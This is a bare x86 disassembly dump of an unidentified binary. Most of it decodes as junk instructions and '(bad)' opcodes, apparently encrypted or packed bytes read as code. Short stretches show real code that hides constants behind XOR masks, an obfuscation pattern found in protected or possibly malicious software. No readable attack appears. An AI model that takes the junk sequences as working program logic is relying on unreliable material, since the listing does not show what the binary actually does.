  420c46:	ss xchg ecx,eax
  420c48:	dec    esi
  420c49:	pusha  
  420c4a:	mov    esi,0xbb990b9a
  420c4f:	push   cs
  420c50:	mov    ecx,0x97a7b13d
  420c55:	sub    BYTE PTR [ebx-0x52d32dc0],0x91
  420c5c:	cmp    al,0x94
  420c5e:	leave  
  420c5f:	cli    
  420c60:	out    0x6c,eax
  420c62:	push   cs
  420c63:	test   BYTE PTR [ebp-0x40028804],ah
  420c69:	fs sbb al,0xbd
  420c6c:	ins    DWORD PTR es:[edi],dx
  420c6d:	sti    
  420c6e:	test   DWORD PTR [edx+0x5422e0e],esi
  420c74:	cwde   
  420c75:	ficom  WORD PTR [ebx-0x40]
  420c78:	xlat   BYTE PTR ds:[ebx]
  420c79:	test   al,0x7e
  420c7b:	jne    0x420c10
  420c7d:	loop   0x420c24
  420c7f:	sub    ch,dh
  420c81:	pop    ss
  420c82:	mov    eax,ds:0x60ecabdb
  420c87:	jnp    0x420c97
  420c89:	mov    gs,WORD PTR [edi+ebp*4]
  420c8c:	push   ebp
  420c8d:	inc    edi
  420c8e:	outs   dx,DWORD PTR ds:[esi]
  420c8f:	and    al,0x4a
  420c91:	imul   ecx,DWORD PTR [ebx],0xffffffeb
  420c94:	xchg   ecx,eax
  420c95:	outs   dx,BYTE PTR ds:[esi]
  420c96:	jb     0x420ce4
  420c98:	(bad)  
  420c99:	push   ss
  420c9a:	iret   
  420c9b:	mov    al,0xc4
  420c9d:	ins    DWORD PTR es:[edi],dx
  420c9e:	imul   esi,esp,0x16
  420ca1:	adc    al,0xff
  420ca3:	int    0x35
  420ca5:	jp     0x420c67
  420ca7:	repz fcom DWORD PTR [ecx-0x1ed9c6ac]
  420cae:	dec    ecx
  420caf:	xchg   ebp,eax
  420cb0:	ja     0x420d00
  420cb2:	stc    
  420cb3:	mov    bh,0xa7
  420cb5:	lea    edi,[ebx+0x39]
  420cb8:	push   ebp
  420cb9:	pop    edx
  420cba:	imul   ebx,DWORD PTR [edx+0x4eeadd2c],0xdd50527e
  420cc4:	cs pushf 
  420cc6:	lock mov ah,al
  420cc9:	jnp    0x420cb7
  420ccb:	loop   0x420c91
  420ccd:	out    0x25,eax
  420ccf:	mov    edi,0x2cda9708
  420cd4:	dec    eax
  420cd5:	jb     0x420d1a
  420cd7:	outs   dx,DWORD PTR ds:[esi]
  420cd8:	push   esp
  420cd9:	scas   al,BYTE PTR es:[edi]
  420cda:	xchg   edx,eax
  420cdb:	mov    bh,0xbc
  420cdd:	mov    ds:0x85027936,eax
  420ce2:	mov    DWORD PTR [esi+0x34],esi
  420ce5:	mov    bl,0x49
  420ce7:	int3   
  420ce8:	dec    esp
  420ce9:	test   ecx,esi
  420ceb:	dec    ebp
  420cec:	cmp    DWORD PTR ss:[eax-0x1b],esp
  420cf0:	mov    esp,0x7eefeaef
  420cf5:	or     BYTE PTR [ebp+0x25],ch
  420cf8:	lahf   
  420cf9:	mov    esp,0xff532469
  420cfe:	mov    ebx,0xd735c0ca
  420d03:	addr16 bnd jl 0x420cc7
  420d07:	push   ecx
  420d08:	inc    eax
  420d09:	jg     0x420d19
  420d0b:	add    al,0x92
  420d0d:	jg     0x420d64
  420d0f:	mov    bl,0xb7
  420d11:	and    ebp,edx
  420d13:	ins    BYTE PTR es:[edi],dx
  420d14:	shl    BYTE PTR [ebx],0x7a
  420d17:	enter  0x8d4e,0x59
  420d1b:	into   
  420d1c:	jge    0x420d48
  420d1e:	pushf  
  420d1f:	pop    ebx
  420d20:	and    esp,DWORD PTR [esi+0x13]
  420d23:	and    dh,BYTE PTR [ecx]
  420d25:	cwde   
  420d26:	xchg   DWORD PTR [ebp+0x10f0e3e7],ebp
  420d2c:	add    edx,esp
  420d2e:	mov    eax,ds:0x40ee7dbb
  420d33:	adc    ebx,0xafed2d84
  420d39:	(bad)  
  420d3a:	jp     0x420d9f
  420d3c:	out    0xdd,eax
  420d3e:	arpl   WORD PTR [edx],ax
  420d40:	mov    BYTE PTR [ecx],bl
  420d42:	lahf   
  420d43:	ss loopne 0x420d6c
  420d46:	pop    edx
  420d47:	or     DWORD PTR [ebx+0x3158b7e0],ecx
  420d4d:	popf   
  420d4e:	test   al,bl
  420d50:	sbb    ecx,esi
  420d52:	pop    ds
  420d53:	rcr    dl,0x5a
  420d56:	cmc    
  420d57:	rol    cl,0x8e
  420d5a:	in     eax,dx
  420d5b:	int3   
  420d5c:	ins    BYTE PTR es:[edi],dx
  420d5d:	pusha  
  420d5e:	in     eax,dx
  420d5f:	push   eax
  420d60:	hlt    
  420d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d62:	jbe    0x420d0b
  420d64:	fiadd  DWORD PTR [edx+ebp*2+0x68bf9783]
  420d6b:	retf   
  420d6c:	mov    esp,0xa401d29f
  420d71:	jecxz  0x420d72
  420d73:	inc    ebx
  420d74:	cli    
  420d75:	daa    
  420d76:	ret    
  420d77:	aad    0x25
  420d79:	or     eax,0xb8d240c2
  420d7e:	cmp    eax,0xe1ce9802
  420d83:	loope  0x420d17
  420d85:	mov    ah,0xfc
  420d87:	push   ecx
  420d88:	imul   edx,ecx,0xffffff8c
  420d8b:	mov    DWORD PTR [ecx],eax
  420d8d:	sbb    BYTE PTR [edx+0x2430d2b8],ch
  420d93:	hlt    
  420d94:	pop    edi
  420d95:	into   
  420d96:	jge    0x420d19
  420d98:	mov    ds:0xfa735cda,eax
  420d9d:	sbb    BYTE PTR ds:0x788a9eb3,ch
  420da4:	pop    es
  420da5:	push   edi
  420da6:	xor    ecx,ecx
  420da8:	jnp    0x420d7e
  420daa:	fld    QWORD PTR [ebx-0x4e]
  420dad:	stc    
  420dae:	xor    al,BYTE PTR [ebp-0x18]
  420db1:	int    0xee
  420db3:	icebp  
  420db4:	jnp    0x420e30
  420db6:	mov    ecx,0xe6875964
  420dbb:	xchg   BYTE PTR [esi+0x39],ch
  420dbe:	dec    ecx
  420dbf:	or     al,0xb8
  420dc1:	jb     0x420da2
  420dc3:	or     eax,0x9af5e193
  420dc8:	pop    esp
  420dc9:	mov    ds:0x73cb6a2f,al
  420dce:	loop   0x420e40
  420dd0:	mov    al,ds:0xb88b2934
  420dd5:	push   cs
  420dd6:	or     ch,BYTE PTR [edx]
  420dd8:	mul    DWORD PTR [ecx+edi*2+0x5c]
  420ddc:	call   0xac507f9b
  420de1:	ja     0x420da5
  420de3:	fcomi  st,st(5)
  420de5:	jl     0x420d71
  420de7:	mov    esi,0x393be9ac
  420dec:	sbb    BYTE PTR [eax-0x5af1fd89],ah
  420df2:	pop    edi
  420df3:	mov    esp,0x4c611c72
  420df8:	mov    eax,0x40d45fe7
  420dfd:	pop    edx
  420dfe:	fs inc ebx
  420e00:	adc    al,0x6d
  420e02:	rcr    ecx,cl
  420e04:	les    edi,FWORD PTR [ebx]
  420e06:	xor    al,0xd5
  420e08:	mov    esp,0x7b782216
  420e0d:	jmp    0xad61:0x945452d7
  420e14:	inc    ecx
  420e15:	mov    DWORD PTR [ebp+0x1c674351],ebp
  420e1b:	fcom   QWORD PTR [ebx-0x77f8c518]
  420e21:	cli    
  420e22:	sar    DWORD PTR [eax],cl
  420e24:	jae    0x420e3d
  420e26:	push   es
  420e27:	sti    
  420e28:	(bad)  
  420e29:	fwait
  420e2a:	or     ecx,DWORD PTR [eiz*8-0x3b51c9a5]
  420e31:	and    eax,0xfbcf41d7
  420e36:	je     0x420de9
  420e38:	cld    
  420e39:	cmp    bh,BYTE PTR [ebp+esi*1+0x46a7cfb4]
  420e40:	mov    esp,0x48928451
  420e45:	xor    bh,BYTE PTR [ebp+0x36bac931]
  420e4b:	push   DWORD PTR [ebx+0x2de8c189]
  420e51:	mov    WORD PTR [ebx+ebp*4+0x3f63bdd8],cs
  420e58:	nop
  420e59:	xor    eax,0x43bb17c4
  420e5e:	add    DWORD PTR [edi],esi
  420e60:	sti    
  420e61:	push   edi
  420e62:	xor    DWORD PTR [ebx-0x7b6c709a],eax
  420e68:	ror    bh,cl
  420e6a:	fdivr  DWORD PTR [eax+eax*1-0x53d8620]
  420e71:	mov    eax,0x50e57b61
  420e76:	popa   
  420e77:	push   es
  420e78:	mov    ds:0xb006ff08,eax
  420e7d:	xor    ebx,0xc7c78dce
  420e83:	mov    edi,0x62ebe9c9
  420e88:	or     BYTE PTR [edx-0x24],ah
  420e8b:	and    cl,BYTE PTR [ebx-0x7d]
  420e8e:	sbb    al,0x29
  420e90:	mov    DWORD PTR [edi],edx
  420e92:	les    esp,FWORD PTR [eax+0x26]
  420e95:	imul   edx,DWORD PTR [ecx],0x1a9a1092
  420e9b:	leave  
  420e9c:	jmp    0x78992c8b
  420ea1:	in     al,dx
  420ea2:	(bad)  
  420ea3:	jmp    0x4f24:0xfb42cf4
  420eaa:	dec    edx
  420eab:	add    eax,0xb8087514
  420eb0:	xchg   ecx,eax
  420eb1:	mov    eax,ds:0x2db2f520
  420eb6:	cwde   
  420eb7:	call   0xad54:0x4fd7365d
  420ebe:	push   eax
  420ebf:	add    eax,0x5d206a4c
  420ec4:	test   al,0x1d
  420ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ec7:	add    DWORD PTR [esi+0x74],0xef69d002
  420ece:	cli    
  420ecf:	xchg   esp,eax
  420ed0:	sti    
  420ed1:	xor    al,0xf7
  420ed3:	fst    QWORD PTR [eax-0x38]
  420ed6:	(bad)  
  420ed7:	and    eax,0xf916543f
  420edc:	popa   
  420edd:	mov    esp,0xe1742e49
  420ee2:	pop    ecx
  420ee3:	(bad)  
  420ee4:	daa    
  420ee5:	scas   al,BYTE PTR es:[edi]
  420ee6:	sbb    al,0xb4
  420ee8:	stos   BYTE PTR es:[edi],al
  420ee9:	push   cs
  420eea:	push   ebp
  420eeb:	inc    esi
  420eec:	imul   esp,DWORD PTR [esp+ecx*2+0x28],0xffffffb3
  420ef1:	addr16 dec eax
  420ef3:	lods   eax,DWORD PTR ds:[esi]
  420ef4:	in     eax,dx
  420ef5:	push   esp
  420ef6:	cs or  al,0xd0
  420ef9:	mov    edx,0xf50b0920
  420efe:	test   al,0x7f
  420f00:	fnsave [esi-0x3b]
  420f03:	and    esp,DWORD PTR [edx]
  420f05:	ins    DWORD PTR es:[edi],dx
  420f06:	stc    
  420f07:	xor    bl,cl
  420f09:	xor    eax,0x55e49d07
  420f0e:	aaa    
  420f0f:	dec    edx
  420f10:	inc    ebp
  420f11:	xor    dl,dl
  420f13:	push   cs
  420f14:	sbb    al,0x20
  420f16:	push   edx
  420f17:	gs jno 0x420e9a
  420f1a:	cli    
  420f1b:	fwait
  420f1c:	ja     0x420ec9
  420f1e:	lahf   
  420f1f:	adc    al,0xc7
  420f21:	mov    edi,0x1783fe78
  420f26:	lods   eax,DWORD PTR ds:[esi]
  420f27:	call   0xeec3bd92
  420f2c:	sbb    BYTE PTR [eax-0x2d90e1d8],bl
  420f32:	inc    esp
  420f33:	add    DWORD PTR [eax+0x26bce04c],ebp
  420f39:	int3   
  420f3a:	stc    
  420f3b:	test   eax,0x1d2864d6
  420f40:	sbb    al,0xd5
  420f42:	push   edx
  420f43:	retf   
  420f44:	psadbw mm7,QWORD PTR [edx-0x235128cf]
  420f4b:	sahf   
  420f4c:	call   FWORD PTR [edi+0x4b]
  420f4f:	scas   eax,DWORD PTR es:[edi]
  420f50:	cmp    ebx,DWORD PTR ss:0x660e9d7b
  420f57:	cmp    bl,BYTE PTR [ecx]
  420f59:	gs cli 
  420f5b:	aam    0x61
  420f5d:	sub    ebx,ebp
  420f5f:	add    eax,0xd8c67de2
  420f64:	test   al,0xa1
  420f66:	cli    
  420f67:	pusha  
  420f68:	push   0x19718d16
  420f6d:	shr    ah,1
  420f6f:	ja     0x420fac
  420f71:	dec    eax
  420f72:	sbb    BYTE PTR [edi],cl
  420f74:	test   BYTE PTR [ecx+0x12],al
  420f77:	add    BYTE PTR [eax],al
  420f79:	mov    eax,DWORD PTR [ebp-0x144]
  420f7f:	mov    ecx,DWORD PTR [ebp-0x38]
  420f82:	mov    edx,DWORD PTR [ebp+0x8]
  420f85:	add    edx,DWORD PTR [ecx+eax*4]
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	pop    eax
  42104d:	push   ebp
  42104e:	push   ds
  42104f:	sahf   
  421050:	xchg   ebx,eax
  421051:	mov    bl,0xc0
  421053:	mov    esi,0xbebec44a
  421058:	lock push ss
  42105a:	dec    esp
  42105b:	mov    edi,DWORD PTR [ecx]
  42105d:	xor    esp,DWORD PTR [edx+0x6a1878a9]
  421063:	int3   
  421064:	loop   0x420fe9
  421066:	sbb    eax,0xe87e12f3
  42106b:	inc    ebp
  42106c:	fwait
  42106d:	add    BYTE PTR [eax],ah
  42106f:	jle    0x42107d
  421071:	push   es
  421072:	mov    esp,edx
  421074:	and    eax,DWORD PTR [edx+0x7a]
  421077:	xor    ecx,DWORD PTR [edi]
  421079:	mov    edx,esp
  42107b:	sub    eax,0x7fa6c7c9
  421080:	(bad)  
  421081:	stos   DWORD PTR es:[edi],eax
  421082:	jmp    0x42109e
  421084:	xchg   esi,eax
  421085:	and    BYTE PTR [edx],ah
  421087:	sub    eax,esi
  421089:	push   es
  42108a:	jecxz  0x421107
  42108c:	in     al,dx
  42108d:	cmp    edx,DWORD PTR [edi]
  42108f:	stc    
  421090:	mov    esp,0x702f290c
  421095:	(bad)  
  421096:	sbb    edx,DWORD PTR [esi]
  421098:	scas   eax,DWORD PTR es:[edi]
  421099:	inc    DWORD PTR [ebx-0x8]
  42109c:	cmp    DWORD PTR [esi+0x320690f4],0xc674e8bf
  4210a6:	pop    ecx
  4210a7:	test   al,0xcc
  4210a9:	push   edx
  4210aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210ab:	mov    edi,gs
  4210ad:	mov    al,0xff
  4210af:	xor    eax,DWORD PTR [edx]
  4210b1:	add    eax,edx
  4210b3:	mov    ebp,0xb4256c8
  4210b8:	jle    0x421123
  4210ba:	rep lods eax,DWORD PTR ds:[esi]
  4210bc:	sbb    eax,0x7f0e2ff7
  4210c1:	pop    eax
  4210c2:	leave  
  4210c3:	test   al,0x47
  4210c5:	adc    DWORD PTR [ebx+0x45e3ae4],esp
  4210cb:	je     0x421081
  4210cd:	mov    al,0x64
  4210cf:	out    dx,eax
  4210d0:	(bad)  
  4210d2:	int    0xf
  4210d4:	imul   ecx,DWORD PTR [eax],0x3f67242d
  4210da:	dec    esi
  4210db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210dc:	rol    ecx,0x90
  4210df:	je     0x4210ef
  4210e1:	dec    ecx
  4210e2:	push   esp
  4210e3:	adc    BYTE PTR [ecx+edx*2+0x2ada6c32],bh
  4210ea:	in     al,dx
  4210eb:	sub    eax,0xd9e584c9
  4210f0:	faddp  st(7),st
  4210f2:	out    0x6c,eax
  4210f4:	mov    edi,0x364832df
  4210f9:	call   0x74047a7b
  4210fe:	sar    BYTE PTR [ebx],cl
  421100:	lahf   
  421101:	jecxz  0x421131
  421103:	mov    al,0xe9
  421105:	xor    BYTE PTR cs:0x28d7266e,dh
  42110c:	dec    esi
  42110d:	jle    0x4210b9
  42110f:	cmp    al,0x97
  421111:	xchg   ebx,eax
  421112:	repnz push 0x5c87801f
  421118:	scas   eax,DWORD PTR es:[edi]
  421119:	push   edi
  42111a:	sub    al,0xcf
  42111c:	std    
  42111d:	jecxz  0x42118b
  42111f:	loope  0x4210dc
  421121:	hlt    
  421122:	mov    ebx,esp
  421124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421125:	mov    ebx,0xcc4b8dd5
  42112a:	daa    
  42112b:	push   ecx
  42112c:	cmc    
  42112d:	push   eax
  42112e:	leave  
  42112f:	cmp    BYTE PTR [ecx-0x67c0c5a9],al
  421135:	lock aas 
  421137:	mov    ds:0x46f7ed5e,al
  42113c:	enter  0xf1c4,0xa1
  421140:	dec    edx
  421141:	aas    
  421142:	loop   0x42115b
  421144:	mov    esp,0xa2ce0447
  421149:	and    BYTE PTR [edx-0x395d9b59],ah
  42114f:	add    al,0x76
  421151:	pop    ds
  421152:	sbb    BYTE PTR [ebp+0x13],cl
  421155:	and    eax,0x3ec32189
  42115a:	test   DWORD PTR [esi-0x4c],ebx
  42115d:	xchg   BYTE PTR [ebp+0x502c506],bl
  421163:	mov    bh,0x80
  421165:	inc    esp
  421166:	in     al,0xac
  421168:	jmp    0x4211d1
  42116a:	in     eax,0xe9
  42116c:	lds    ebx,FWORD PTR [edi+0x3037037e]
  421172:	xor    BYTE PTR [ebx-0x7c],dl
  421175:	jns    0x4211db
  421177:	push   0x75
  421179:	mov    ds,WORD PTR [edx-0x53d4da61]
  42117f:	mov    edi,?
  421181:	xchg   edi,eax
  421182:	mov    ch,0x32
  421184:	mov    cl,0x18
  421186:	inc    ebp
  421187:	xchg   ah,ah
  421189:	stc    
  42118a:	mov    esp,?
  42118c:	loope  0x4211d1
  42118e:	out    dx,al
  42118f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421190:	int3   
  421191:	jnp    0x4211f3
  421193:	and    ecx,DWORD PTR gs:[esi-0x63]
  421197:	(bad)  
  421198:	jg     0x4211e0
  42119a:	stos   BYTE PTR es:[edi],al
  42119b:	and    DWORD PTR [ebp+0x1bd70cf2],eax
  4211a1:	hlt    
  4211a2:	jle    0x421153
  4211a4:	xor    BYTE PTR [edi-0x4f],bh
  4211a7:	push   ebx
  4211a8:	jnp    0x4211c1
  4211aa:	js     0x421176
  4211ac:	dec    eax
  4211ad:	dec    edx
  4211ae:	xor    edi,DWORD PTR [eax+0x6b]
  4211b1:	test   edx,ebp
  4211b3:	dec    ebx
  4211b4:	xchg   BYTE PTR [edi+0x7e],ah
  4211b7:	out    dx,al
  4211b8:	mov    edx,0x716573a5
  4211bd:	fdivr  DWORD PTR [ecx+0x7533859e]
  4211c3:	je     0x421172
  4211c5:	(bad)  
  4211c6:	xchg   esi,eax
  4211c7:	jmp    0x42122f
  4211c9:	out    dx,al
  4211ca:	mov    edi,ss
  4211cc:	cmc    
  4211cd:	xor    eax,0xbb36f5a7
  4211d2:	arpl   WORD PTR [edi+ebx*8],ax
  4211d5:	test   esi,0x36fa0ab8
  4211db:	dec    edi
  4211dc:	xchg   ebp,eax
  4211dd:	aas    
  4211de:	test   DWORD PTR [eax+0x66],edi
  4211e1:	xor    al,0x52
  4211e3:	(bad)  
  4211e4:	jmp    0xc05a:0x29d15793
  4211eb:	ja     0x4211f8
  4211ed:	into   
  4211ee:	dec    eax
  4211ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211f0:	or     al,0x29
  4211f2:	shl    ebp,cl
  4211f4:	pusha  
  4211f5:	mov    BYTE PTR [eax+0x1f973006],ah
  4211fb:	loope  0x4211ec
  4211fd:	out    0xce,al
  4211ff:	push   0x4d874fb6
  421204:	jg     0x4211da
  421206:	cmp    DWORD PTR [ebp-0x52],esp
  421209:	les    edx,FWORD PTR [esi+0x8]
  42120c:	cmp    BYTE PTR [eax-0x168197c4],dh
  421212:	gs pop ebp
  421214:	sub    DWORD PTR [esi],edx
  421216:	pop    ebx
  421217:	frstor [eax+0xa]
  42121a:	into   
  42121b:	pop    DWORD PTR [esi+esi*1-0x9a8bd23]
  421222:	add    al,0xf8
  421224:	ret    
  421225:	mov    dh,0x3a
  421227:	test   eax,0xde6fdafd
  42122c:	push   esi
  42122d:	mov    eax,0x5f2e295d
  421232:	mov    WORD PTR [ebx+edi*2],?
  421235:	mov    esp,0x8124ab34
  42123a:	and    eax,0x197b9f5d
  42123f:	out    dx,al
  421240:	add    BYTE PTR [edx],dh
  421242:	add    eax,0x4a5c8cd3
  421247:	(bad)  
  421249:	jl     0x4212aa
  42124b:	std    
  42124c:	test   BYTE PTR [ebp+0x4b],ah
  42124f:	push   esp
  421250:	out    dx,al
  421251:	cdq    
  421252:	(bad)  
  421253:	jmp    DWORD PTR [eax-0x6c]
  421256:	add    DWORD PTR [ebp+0x7a],ecx
  421259:	(bad)  
  42125a:	xor    al,0x49
  42125c:	xchg   ebx,eax
  42125d:	in     al,dx
  42125e:	jo     0x421244
  421260:	adc    esp,0xffffff81
  421263:	ins    BYTE PTR es:[edi],dx
  421264:	inc    ebp
  421265:	loopne 0x4212a5
  421267:	cdq    
  421268:	ins    BYTE PTR es:[edi],dx
  421269:	mov    eax,DWORD PTR [ebp-0x2894a4ae]
  42126f:	ret    0x6d47
  421272:	inc    esp
  421273:	adc    eax,0xada4ac83
  421278:	call   0x3093:0x1cbc0cd1
  42127f:	mov    ecx,0x58c70961
  421284:	rcr    esp,1
  421286:	test   eax,0x977d2154
  42128b:	pop    ebx
  42128c:	cld    
  42128d:	push   0x40
  42128f:	popf   
  421290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421291:	enter  0xe017,0xe4
  421295:	dec    BYTE PTR [eax+0x1a30d75f]
  42129b:	sub    esi,ecx
  42129d:	ds in  al,0x57
  4212a0:	fdivr  DWORD PTR [eax+0x74]
  4212a3:	adc    al,0x4d
  4212a5:	call   0x70b93c42
  4212aa:	mov    cl,0xb9
  4212ac:	mov    ah,0xa1
  4212ae:	nop
  4212af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212b0:	or     esp,0x67
  4212b3:	xor    edx,eax
  4212b5:	scas   al,BYTE PTR es:[edi]
  4212b6:	mov    ds:0x1e25ec9e,eax
  4212bb:	pusha  
  4212bc:	push   eax
  4212bd:	push   es
  4212be:	test   al,0x83
  4212c0:	data16 sti 
  4212c2:	adc    esi,DWORD PTR [ebx-0x4c]
  4212c5:	stos   BYTE PTR es:[edi],al
  4212c6:	push   edi
  4212c7:	cmp    al,0xc2
  4212c9:	inc    ecx
  4212ca:	mov    edi,0x8dcd613a
  4212cf:	jg     0x4212ed
  4212d1:	sbb    BYTE PTR [eax+0x78],dh
  4212d4:	dec    edi
  4212d5:	adc    edx,DWORD PTR [eax]
  4212d7:	mov    WORD PTR [edx-0xfb6a620],fs
  4212dd:	push   edi
  4212de:	xchg   edx,eax
  4212df:	rcl    edx,cl
  4212e1:	nop
  4212e2:	inc    edx
  4212e3:	mov    ecx,0x9881a491
  4212e8:	ins    DWORD PTR es:[edi],dx
  4212e9:	dec    edi
  4212ea:	xchg   dh,cl
  4212ec:	nop
  4212ed:	sub    al,0xa5
  4212ef:	ret    0xad6f
  4212f2:	xchg   esi,eax
  4212f3:	add    eax,eax
  4212f5:	push   esp
  4212f6:	test   al,0x8b
  4212f8:	ins    DWORD PTR es:[edi],dx
  4212f9:	sbb    BYTE PTR [eax+0xb],dl
  4212fc:	das    
  4212fd:	mov    ebp,0x68400951
  421302:	retf   
  421303:	scas   al,BYTE PTR es:[edi]
  421304:	ror    DWORD PTR [eax],1
  421306:	mov    WORD PTR [esi],ds
  421308:	(bad)  
  421309:	fdiv   QWORD PTR [ebp-0x50]
  42130c:	jmp    0xbf4fc6c4
  421311:	sub    eax,0x3c4bb386
  421316:	sbb    ah,dh
  421318:	sti    
  421319:	jle    0x42132e
  42131b:	js     0x42137c
  42131d:	mov    ds:0x8a3bf0e7,al
  421322:	mul    DWORD PTR [ecx-0x57]
  421325:	add    ah,dh
  421327:	jle    0x4212d8
  421329:	add    esp,eax
  42132b:	mov    ch,0x23
  42132d:	xor    dl,BYTE PTR [ecx+0x2cd3099d]
  421333:	nop
  421334:	cli    
  421335:	pop    ebx
  421336:	mov    ds,WORD PTR [ecx]
  421338:	outs   dx,BYTE PTR ds:[esi]
  421339:	mov    esp,0xbca8159
  42133e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42133f:	fdiv   DWORD PTR [esi]
  421341:	loopne 0x42130a
  421343:	mov    al,ds:0x174cb5c2
  421348:	mov    ebp,0xcee0feb1
  42134d:	or     WORD PTR [ebx+edx*4+0x6c],bp
  421352:	adc    edi,DWORD PTR [ecx+eiz*4]
  421355:	dec    esp
  421356:	icebp  
  421357:	ins    DWORD PTR es:[edi],dx
  421358:	pop    esp
  421359:	or     al,BYTE PTR [ebx+0x77]
  42135c:	sbb    eax,0xc518b134
  421361:	inc    esi
  421362:	mov    al,0x8c
  421364:	sub    cl,0xaa
  421367:	out    0x3b,eax
  421369:	jge    0x4213d0
  42136b:	ins    DWORD PTR es:[edi],dx
  42136c:	pop    esp
  42136d:	jb     0x421363
  42136f:	scas   eax,DWORD PTR es:[edi]
  421370:	mov    gs,WORD PTR [esi+0x69ec43c1]
  421376:	or     eax,DWORD PTR [ebx+edx*1-0x6fb8a189]
  42137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42137e:	aad    0x9e
  421380:	(bad)  
  421382:	push   0x2b6c189e
  421387:	bound  ebp,QWORD PTR [ecx]
  421389:	in     al,dx
  42138a:	out    0x53,eax
  42138c:	stc    
  42138d:	sbb    DWORD PTR [eax-0x3af0faa2],edi
  421393:	mov    DWORD PTR [ecx],esi
  421395:	shl    BYTE PTR [edx],1
  421397:	mov    bh,0x9b
  421399:	jne    0x421346
  42139b:	(bad)
  42139e:	fild   DWORD PTR [esi-0x1d5ae202]
  4213a4:	clc    
  4213a5:	add    ebp,esp
  4213a7:	add    BYTE PTR [edx+0x35],cl
  4213aa:	(bad)  [eax]
  4213ac:	lods   al,BYTE PTR ds:[esi]
  4213ad:	lock les esp,FWORD PTR [edx]
  4213b0:	cmp    BYTE PTR [edx-0x6fec4af8],cl
  4213b6:	scas   al,BYTE PTR es:[edi]
  4213b7:	(bad)  
  4213b9:	cmp    eax,0x90200954
  4213be:	sbb    BYTE PTR [edi+0x2947c1f],dh
  4213c4:	jg     0x421418
  4213c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c7:	out    dx,al
  4213c8:	or     DWORD PTR [esi-0x1d893ab7],esi
  4213ce:	mov    al,ds:0x37000d5f
  4213d3:	inc    edi
  4213d4:	and    bh,bl
  4213d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d7:	retf   0x5ab6
  4213da:	inc    ebx
  4213db:	test   BYTE PTR [eax],al
  4213dd:	mov    ds:0x670faa52,al
  4213e2:	pop    edx
  4213e3:	pop    ecx
  4213e4:	add    DWORD PTR [esi],edi
  4213e6:	outs   dx,BYTE PTR ds:[esi]
  4213e7:	sub    bl,ah
  4213e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ea:	mov    ds:0xa2f121ee,eax
  4213ef:	aaa    
  4213f0:	dec    ebx
  4213f1:	xchg   ecx,eax
  4213f2:	inc    eax
  4213f3:	iret   
  4213f4:	loope  0x42144f
  4213f6:	push   ds
  4213f7:	ror    DWORD PTR [eax+eiz*1],1
  4213fa:	cli    
  4213fb:	int3   
  4213fc:	mov    ds:0x78c30e08,al
  421401:	inc    esp
  421402:	(bad)  
  421403:	test   al,0x5c
  421405:	fsubr  QWORD PTR [eax]
  421407:	dec    ebx
  421408:	loop   0x421401
  42140a:	mov    al,ds:0x52a79484
  42140f:	cli    
  421410:	test   dl,ah
  421412:	aam    0x6c
  421414:	sbb    al,dl
  421416:	sbb    WORD PTR [edx+0x2b],0xffb6
  42141b:	cld    
  42141c:	mov    eax,ds:0x646fb8a9
  421421:	and    eax,DWORD PTR [ecx+0x2b8ae8f2]
  421427:	pushf  
  421428:	mov    cl,0x3e
  42142a:	call   0x4223f7
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
